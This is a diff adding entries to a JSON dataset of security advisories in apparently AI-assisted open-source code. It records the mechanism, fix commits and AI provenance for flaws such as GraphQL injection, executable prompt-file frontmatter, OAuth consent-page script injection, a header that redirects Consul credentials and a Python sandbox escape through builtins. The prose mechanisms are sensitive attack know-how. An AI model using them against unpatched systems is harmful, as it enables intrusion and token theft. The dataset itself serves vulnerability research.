+   "minimum_fix_set": [
+    "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
+   ],
+   "ir_chain": {
+    "original_advisory_ids": [
+     "GHSA-5C7W-4WM3-85VW"
+    ],
+    "original_mechanism": "Attacker-controlled GraphQL metacharacters reached query-string concatenation.",
+    "original_sink": "SpecifyJS graphql.ts gql() construction",
+    "original_author_kind": "AI",
+    "original_author_name": "Sam Caldwell",
+    "original_sha": "5abd65759440ec2f243e78320befd7d77c3b0e78",
+    "unresolved_reason": null,
+    "attempted_remediation": {
+     "candidate_shas": [
+      "caa8fbfa4d7d99e02dca3ee0df642b30a5d856cc"
+     ],
+     "changed": "Detected GraphQL metacharacters and emitted a warning.",
+     "missed": "Continued concatenating the value into gql() after the warning."
+    },
+    "residual_bypass": "A warned metacharacter payload still reached the GraphQL query sink.",
+    "final_closure": {
+     "minimum_fix_shas": [
+      "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
+     ],
+     "closed": "Changed the warning path to throw before query construction."
+    }
+   },
+   "vulnerable_release": {
+    "advisory_range": "< 0.2.136",
+    "contains_candidate": true,
+    "contains_fix": false,
+    "git_tag_commit": "a84103e7dc3e3283279058d8f7e5a3c01a79fa3d",
+    "github_release_object": "404",
+    "kind": "npm_gitHead_equals_peeled_tag_commit",
+    "name": "@asymmetric-effort/specifyjs",
+    "npm_gitHead": "a84103e7dc3e3283279058d8f7e5a3c01a79fa3d",
+    "sha": "a84103e7dc3e3283279058d8f7e5a3c01a79fa3d",
+    "tag": "v0.2.135",
+    "tarball": "https://registry.npmjs.org/@asymmetric-effort/specifyjs/-/specifyjs-0.2.135.tgz",
+    "tarball_sha256": "06ef2f4f36baf2ba1be086bcd782171cbfb81477bddc25acc685b8a652fffa1c",
+    "version": "0.2.135"
+   },
+   "fixed_release": {
+    "advisory_first_patched": "0.2.136",
+    "contains_fix": true,
+    "equals_minimum_fix": true,
+    "git_tag_commit": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+    "github_release_object": "404",
+    "kind": "npm_gitHead_equals_peeled_tag_commit_equals_fix",
+    "name": "@asymmetric-effort/specifyjs",
+    "npm_gitHead": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+    "sha": "25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+    "tag": "v0.2.136",
+    "tarball": "https://registry.npmjs.org/@asymmetric-effort/specifyjs/-/specifyjs-0.2.136.tgz",
+    "tarball_sha256": "924ad43cf57d1dcefeaec15b4a7fa53794fb50f5f365d62ac8c643cd34c78d10",
+    "version": "0.2.136"
+   },
+   "published_at": "2026-07-02",
+   "severity": "MEDIUM",
+   "cwes": [
+    "CWE-943"
+   ],
+   "references": [
+    "https://github.com/asymmetric-effort/specifyjs/security/advisories/GHSA-5c7w-4wm3-85vw",
+    "https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a",
+    "https://github.com/asymmetric-effort/specifyjs"
+   ],
+   "cause_category": "validation_fail_open",
+   "ai_provenance": {
+    "family": "claude",
+    "coverage": "complete",
+    "candidate_count": 1,
+    "named_candidate_count": 1,
+    "note": "Co-Authored-By: Claude Opus 4.6 (1M context)"
+   },
+   "fix_authorship": {
+    "classification": "ai_assisted",
+    "families": [
+     "claude_code"
+    ],
+    "fixes": [
+     {
+      "author": {
+       "email": "github@samcaldwell.net",
+       "name": "Sam Caldwell"
+      },
+      "authored_at": "2026-05-29T02:58:11+00:00",
+      "classification": "ai_assisted",
+      "evidence": [
+       {
+        "family": "claude_code",
+        "kind": "coauthor_trailer",
+        "text": "Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>"
+       }
+      ],
+      "families": [
+       "claude_code"
+      ],
+      "sha": "25d1fb491d99479efdf501f5f75e0bb80c908f0a"
+     }
+    ]
+   }
+  },
+  {
+   "class_id": "alias-50a179b091fae05cd3c940e9",
+   "case_id": "GHSA-C4GH-RV8H-Q9VW",
+   "aliases": [
+    "CVE-2026-53597",
+    "alias-50a179b091fae05cd3c940e9"
+   ],
+   "repository": "microsoft/prompty",
+   "repository_metadata": {
+    "full_name": "microsoft/prompty",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "mechanism": "The parsing step called gray-matter without an engines override, and gray-matter's defaults include a JavaScript engine that evaluates a frontmatter block opened with ---js. Any .prompty file taken from a shared prompt bundle, a user-supplied path or an LLM-generated prompt therefore ran code inside the loading Node.js process before rendering. The repair passes an explicit engines map that replaces the js and javascript parsers with a function that throws, and a regression test asserts the block is rejected and its payload never runs.",
+   "description": "The TypeScript Prompty loader reads a .prompty file, splits its frontmatter from the markdown body and builds a typed prompt object. The split used gray-matter with its default engine set, which treats a frontmatter block opened with ---js as JavaScript and evaluates it. The file being parsed is the attacker-controlled artifact, so a prompt file from an untrusted source executed code with the privileges of the Node.js host process at load time, before any template rendering happened. The repair hands gray-matter an explicit engines map whose js and javascript entries throw, so executable frontmatter is refused rather than evaluated, and the accompanying regression test writes a ---js prompt that tries to create a file and then asserts the file never appears.",
+   "code_evidence": {
+    "summary": "A Copilot-assisted TypeScript runtime loaded .prompty files through gray-matter with the library's default frontmatter engines, so a file that opened with a JavaScript frontmatter block ran its code during parsing. The repair rejects JavaScript frontmatter outright."
+   }
+  },
+  {
+   "class_id": "alias-51615747534e79a30d553407",
+   "case_id": "GHSA-P52P-4VMG-4VQ3",
+   "aliases": [
+    "CVE-2026-49973",
+    "alias-51615747534e79a30d553407"
+   ],
+   "repository": "nesquena/hermes-webui",
+   "repository_metadata": {
+    "full_name": "nesquena/hermes-webui",
+    "language": "Python",
+    "archived": false
+   },
+   "mechanism": "On a fresh instance no password is configured, so the request check admits every client by design. The generic settings endpoint still honoured a private _set_password field: it hashed the caller's value into settings.json as password_hash, which switches authentication on, and the caller could then sign in with the password they had chosen. The repair refuses first-password setup from a non-local client while auth is disabled, unless the operator deliberately opens remote bootstrap.",
+   "description": "This WebUI ships with optional password auth switched off, so every request is allowed through until an operator sets a password. The same change that added passwords taught the already generic settings endpoint to read a private _set_password field, hash the value and persist it as password_hash, with no check on where the request came from. Anyone able to reach the port during the first-run window could therefore install their own password, log in with it, and leave the intended operator outside their own instance. The fix captures the auth state at the start of the request and refuses a first-password write from a non-local client while auth is still disabled; local and private-network clients still work, and an operator can opt in to remote bootstrap on purpose.",
+   "code_evidence": {
+    "summary": "An AI-assisted change let the ordinary settings request install the first password of a passwordless Hermes WebUI, so a remote caller who reached the port during first run could choose the owner credential and lock the operator out."
+   }
+  },
+  {
+   "class_id": "alias-6fa8cee871e7f5f2b5a07c0b",
+   "case_id": "GHSA-QJPC-QF9M-XWMR",
+   "aliases": [
+    "alias-6fa8cee871e7f5f2b5a07c0b"
+   ],
+   "repository": "openclaw/openclaw",
+   "repository_metadata": {
+    "full_name": "openclaw/openclaw",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "mechanism": "Trusted-proxy Control UI connections were allowed to skip device pairing, so the gateway honored the operator scopes a client declared on its WebSocket connect request before any device identity or pairing baseline was bound to the connection. The connection policy returned a pairing bypass whenever trusted-proxy authentication succeeded, the missing-device-identity check answered allow for the same condition, and the client's declared scopes survived, which let an unpaired or restricted user exercise admin-gated gateway calls for the life of the connection. The repair drops the proxy pairing bypass, requires pairing before proxy-scoped access, clears self-declared scopes when no device identity exists, and stops issuing device tokens on that path.",
+   "description": "Openclaw's gateway can authenticate Control UI sessions through a reverse proxy, and in that mode a client still has to pair a device before the scopes it asks for are trusted. A change shipped in 2026.2.24 made a successful trusted-proxy authentication sufficient to skip pairing and to satisfy the missing-device-identity check, so a connection that presented a fresh, unpaired device identity could request elevated operator scopes and keep them, up to cached operator-admin authority over live gateway calls. A role gate added days later limited the same bypass to operator-role sessions, which left this operator-role scope-binding flaw on the same code path. Release 2026.5.18 removes the proxy pairing bypass, requires pairing before proxy-scoped access, clears unbound scopes and stops issuing device tokens without a paired device identity.",
+   "code_evidence": {
+    "summary": "Openclaw 2026.2.24 through 2026.5.12 treated successful trusted-proxy authentication as enough to skip device pairing, so a restricted or unpaired Control UI client could keep the operator scopes it declared on connect and use admin-only gateway calls on that connection; 2026.5.18 requires pairing first."
+   }
+  },
+  {
+   "class_id": "alias-945d447820a8998f330f65d1",
+   "case_id": "GHSA-PF93-J98V-25PV",
+   "aliases": [
+    "CVE-2026-32112",
+    "alias-945d447820a8998f330f65d1"
+   ],
+   "repository": "homeassistant-ai/ha-mcp",
+   "repository_metadata": {
+    "full_name": "homeassistant-ai/ha-mcp",
+    "language": "Python",
+    "archived": false
+   },
+   "mechanism": "The consent page was assembled from f-strings and none of the interpolated values were escaped, so the registered application name appeared as markup and the client id, redirect URI and state sat inside hidden field value attributes, where a double quote ends the attribute and lets an attacker add further markup. The error views printed the OAuth error code and description the same way. Client registration is open by design, so an attacker registers an application whose fields carry the payload and sends the operator the authorization link; script running on that page reads the Home Assistant long-lived access token the operator types in and sends it to the attacker. The remedy escapes every interpolated value and stops displaying the application name.",
+   "description": "OAuth mode is a beta feature of ha-mcp that needs MCP_BASE_URL and serves the consent endpoint on every interface, so anyone who can reach it can register a dynamic client without an initial access token. The consent form shown to the operator was built from Python f-strings: the application name was printed as markup, the client id, redirect URI and state were printed inside hidden input value attributes, and the error pages printed the error code and description, all without escaping. A registered application name carrying markup therefore executed in the operator's browser, and an injected quote could add attributes or tags of the attacker's choosing. Exploitation needs the operator to open a crafted authorization link for an application they do not recognize, and the prize is the Home Assistant access token entered on that page. Release 7.0.0 escapes every interpolated value and displays the redirect domain instead of the application name.",
+   "code_evidence": {
+    "summary": "An AI-assisted change added an OAuth consent form that wrote the client name, client id, redirect URI, state and error text into HTML through Python f-strings, so a registration an attacker controls could run script in the browser of the operator who opens the page."
+   }
+  },
+  {
+   "class_id": "alias-acc45658f2012c869ccb422f",
+   "case_id": "GHSA-5H6C-295F-7PP3",
+   "aliases": [
+    "CVE-2026-16328",
+    "alias-acc45658f2012c869ccb422f"
+   ],
+   "repository": "hashicorp/consul-mcp-server",
+   "repository_metadata": {
+    "full_name": "hashicorp/consul-mcp-server",
+    "language": "Go",
+    "archived": false
+   },
+   "mechanism": "The request middleware copied an X-Consul-Address header into the request context, and the client builder used that value as the Consul address for every API call made while handling the request. A client could therefore redirect the server's Consul traffic to an endpoint it controlled and read the configured Consul token from the outgoing request the server sent there.",
+   "description": "The server bridges MCP clients to a Consul cluster and is deployed with one Consul endpoint and one Consul token. The request path let the client choose that endpoint: a header put an address into the request context, and the client builder replaced the configured address with it, so the server's own credentials stayed attached to the redirected call. Anyone able to reach the server could send its Consul API traffic to a host they controlled and observe the Consul token travelling with it. The hardening change removes the header read and the context override and keeps the Consul address on the server's CONSUL_HTTP_ADDR setting, which closes the redirect.",
+   "code_evidence": {
+    "summary": "An AI-assisted change let a connecting client pick the Consul API address with a request header, so the server could be pointed at an attacker-controlled endpoint and send along the Consul token it was configured with."
+   }
+  },
+  {
+   "class_id": "alias-ca062bdf2a1afef0fdfe5205",
+   "case_id": "GHSA-4MR5-G6F9-CFRH",
+   "aliases": [
+    "CVE-2026-47392",
+    "alias-ca062bdf2a1afef0fdfe5205"
+   ],
+   "repository": "mervinpraison/praisonai",
+   "repository_metadata": {
+    "full_name": "mervinpraison/praisonai",
+    "language": "Python",
+    "archived": false
+   },
+   "mechanism": "In sandbox mode the tool compiles the submitted program into a fresh subprocess after a static scan of its syntax tree. The scan refuses imports, a fixed set of attribute names and a few calls written as bare names, and it deliberately skips the text-pattern list that the older in-process mode uses. The safe builtins dictionary handed to the subprocess is built from the real CPython functions, and such a function carries a __self__ reference back to the builtins module, which the list never named. From that module a program can reach the import hook, load the os module and run shell commands with the privileges of the host process.",
+   "description": "PraisonAI lets an agent run Python through an execute_code helper. A change in the 1.6 line moved that execution into a separate process and reused the older checks, but the check that walks the syntax tree only knew a fixed list of dangerous attribute names, and the list missed the attribute through which a bound CPython builtin exposes the module it belongs to. Because the same change also stopped running the text-pattern list in the default sandbox mode, and because names assembled from short string pieces never look dangerous to a static reader, the whole guard could be stepped around with a handful of statements.\n\nAnyone able to steer code into the helper, directly or through an agent prompt, gets command execution with the permissions of the service account: the published proof runs the identity command inside the sandbox and prints its output. The hardened release adds the missing attribute and the helper call to the blocked sets, also screens calls written as attribute access rather than bare names, and runs the same syntax check on the way into the sandboxed path, so the proof is refused before it starts.",
+   "code_evidence": {
+    "summary": "The execute_code tool's subprocess sandbox screened submitted programs against a fixed list of dangerous attribute names, and that list omitted the attribute that exposes the live builtins module, so a short program could still run operating system commands as the server user."
+   }
+  },
+  {
+   "class_id": "alias-e48c6f8662352f3d6e87afad",
+   "case_id": "GHSA-RQP8-Q22P-5J9Q",
+   "aliases": [
+    "CVE-2026-35635",
+    "alias-e48c6f8662352f3d6e87afad"
+   ],
+   "repository": "openclaw/openclaw",
+   "repository_metadata": {
+    "full_name": "openclaw/openclaw",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "mechanism": "The channel resolved each account by merging its overrides over the channel settings, and the webhook path fell back to the channel value or to a fixed default. Every named account that did not override the path therefore came out with one address, and the route registry keeps a single handler per address, so the accounts collapsed onto one route: the account that owned that route applied its own sender allowlist and direct-message policy to traffic that belonged to the other accounts, which is the separation the advisory is about. The repair refuses to start an account that inherits a shared path in a multi-account setup or that resolves to a path another enabled account already uses, and it registers the route without replacing an existing one.",
+   "description": "Synology Chat supports several accounts under one channel, each with its own token, sender allowlist and direct-message policy. The account resolver merged each account's overrides over the channel configuration and let the webhook path fall back to the channel value, or to a fixed default when the channel set none, so a second account that did not name its own path came out with the same address as the first. The route registry keeps one handler per address, so the accounts shared a single route and the account that owned it answered for the others under its own rules. The channel first shipped in release 2026.2.22 and the behaviour is present through release 2026.3.13-1; the repair published in release 2026.3.22 refuses inherited and duplicate webhook paths at startup and stops replacing an existing route.",
+   "code_evidence": {
+    "summary": "An AI-assisted change added a Synology Chat channel in which every account inherited the channel-level webhook path, so accounts that did not set their own path resolved to the same address and one account's route took over the traffic of the others under the wrong sender rules."
    }
   }
  ]
